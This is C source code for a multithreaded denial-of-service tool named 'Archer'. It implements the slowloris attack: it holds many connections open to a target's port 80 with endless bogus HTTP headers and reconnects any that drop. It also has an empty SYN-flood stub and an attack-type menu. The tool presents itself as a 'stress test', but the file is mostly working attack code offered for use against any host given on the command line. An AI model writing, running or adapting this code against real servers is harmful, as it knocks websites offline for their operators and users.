#include "main.h"


/*
 * main():
 *	Main entry point of application.
 */
int main(int argc, char **argv) {
	int			numThreads, c, index, found;
	char			*target, *type = "http-get";
	struct attackTypes	useType;
	struct option		options[] = {
		{"threads", required_argument, 0, 't'},
		{"attack", required_argument, 0, 'a'},
		{"sockets", required_argument, 0, 's'},
		{"port", required_argument, 0, 'p'},
		{0, 0, 0, 0}
	};

	/* Default variables. */
	numThreads = 10;
	readCount = 0;
	sendCount = 0;
	reloadCount = 0;
	sockets = 25;
	port = 0;

	/* Scan for cli options. */
	while ((c = getopt_long(argc, argv, "a:t:s:p:", options, NULL)) != -1) {
		switch (c) {
			case 's':
				sockets = atoi(optarg);
				break;

			case 't':
				numThreads = atoi(optarg);
				break;

			case 'a':
				type = (char *)malloc(strlen(optarg) + 1);
				snprintf(type, strlen(optarg) + 1, "%s", optarg);
				break;

			case 'p':
				port = atoi(optarg);
				break;

			default:
				showUsage();
		}
	}
	
	/* Check for the last argument. */
	if (optind == argc)
		showUsage();
	
	/* Grab the target. */
	target = (char *)malloc(strlen(argv[argc - 1]) + 1);
	snprintf(target, strlen(argv[argc - 1]) + 1, "%s", argv[argc - 1]);

	/* Get our attack type. */
	found = 0;
	for (index = 0; index < NUM_ATTACKS; index++) {
		if (strstr(attacks[index].type, type) != NULL) {
			useType = attacks[index];
			found = 1;
		}
	}

	if (!found) {
		printf("error: unkown type '%s'\n", type);
		showUsage();
	}

	/* Some types needs certain arguments. */
	if (strstr(useType.type, "syn") != NULL) {
		if (port == 0) {
			printf("error: specify a port with -p\n");
			showUsage();
		}
	}

	/* Setup our worker threads. */
	pthread_t		threads[numThreads];

	printf("[Archer]: Setting target for stress test: '%s'\n", target);
	printf("[Archer]: Using %d sockets and %d threads\n", sockets, numThreads);

	/* Start the worker threads. */
	for (index = 0; index < numThreads; index++)
		pthread_create(&threads[index], NULL, useType.f, (void *)target);

	/* XXX Do we really need this? XXX Read statistics. */
	for (;;) {
		/* Lock mutex. */
		pthread_mutex_lock(&mutex);
		sendCount = 0;
		readCount = 0;
		reloadCount = 0;
		pthread_mutex_unlock(&mutex);
		sleep(5);		
	}
	

	return (0);
}

/*
 * httpGet(data):
 *	Launches a typical HTTP GET request with bogus headers
 *	that never really seem to end.
 *	AKA the slowloris attack.
 */
void httpGet(void *data) {
	int			*sock, ret, read, sent, i;
	char			buffer[512], *target, *get, rHeader[6];
	struct addrinfo		hints, *info;

	target = (char *)data;
	sock = (int *)malloc(sockets * sizeof(int));

	/* XXX I can do this better, fix later. */
	rHeader[1] = ':';
	rHeader[2] = ' ';
	rHeader[3] = '\r';
	rHeader[4] = '\n';

	/* Set up default GET call. */
	get = (char *)malloc(209 + strlen(target));
	snprintf(get, 209 + strlen(target), "GET / HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nHost: %s\r\nConnection: Keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT en-US; 6.1; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17\r\nAccept: */*\r\n", target);

	/* Prepare connection. */
	memset(&hints, 0, sizeof (hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	info = (struct addrinfo*)malloc(sizeof(struct addrinfo));
	getaddrinfo(target, "80", &hints, &info);

	/* Initate connection. */
	for (i = 0; i < sockets; i++) {
		sock[i] = socket(info->ai_family, info->ai_socktype, info->ai_protocol);
		if (sock[i] == -1)
			perror("Sockets");

		fcntl(sock[i], F_SETFL, O_NONBLOCK);
		if (connect(sock[i], info->ai_addr, info->ai_addrlen) == -1) {
			printf("[Archer]: Could not reach target host '%s'.\n", target);
			return;
		}

		/* Send initial payload. */		
		sent = send(sock[i], get, 209 + strlen(target), 0);

		/* Read but ignore data. */
		while ((ret = recv(sock[i], buffer, sizeof(buffer), 0)) > 0)
			read += ret;

	}

	/* Keep sending headers. */
	for (;;) {
		read = 0;
		sent = 0;

		for (i = 0; i < sockets; i++) {
			if (sock[i] == -1) {
				ret = 0;
			} else {
				/* Generate random fake header. */
				rHeader[0] = rand() % 26;
				rHeader[5] = rand() % 26;
				printf("Header: %s\n", rHeader);

				/* Send payload. */
				sent = send(sock[i], rHeader, 4, 0);

				/* Read but ignore data. */
				while ((ret = recv(sock[i], buffer, sizeof(buffer), 0)) > 0) {
					read += ret;
				}
				
			}

			/* Reconnect if needed. */
			if (ret == 0) {
				close(sock[i]);
				sock[i] = socket(info->ai_family, info->ai_socktype, info->ai_protocol);
				fcntl(sock[i], F_SETFL, O_NONBLOCK);
				connect(sock[i], info->ai_addr, info->ai_addrlen);
				reloadCount++;
			}
		}

		/* Save statisticts. */
		pthread_mutex_lock(&mutex);
		readCount += read;
		sendCount += sent;
		pthread_mutex_unlock(&mutex);
	}
}

/*
 * syn():
 *	Synflood attack.
 */
void syn(void *data) {

}

/*
 * showUsage():
 *	Displays usage.
 */
void showUsage() {
	printf("usage: archer [-t threads] [-s sockets] [-a attack type] [-p port] target\n");
	printf("\t-t, --threads:\tNumber of worker threads\n");
	printf("\t-s, --sockets:\tNumber of sockets used per thread\n");
	printf("\t\t\tdefault: 25\n");
	printf("\t-p, --port:\tPort to attack on\n");
	printf("\t-a, --attack:\tAttack type\n");
	printf("\t\t\thttp-get, http-keepalive, syn\n");
	printf("\t\t\tdefault: http-get\n");
	exit(99);
}
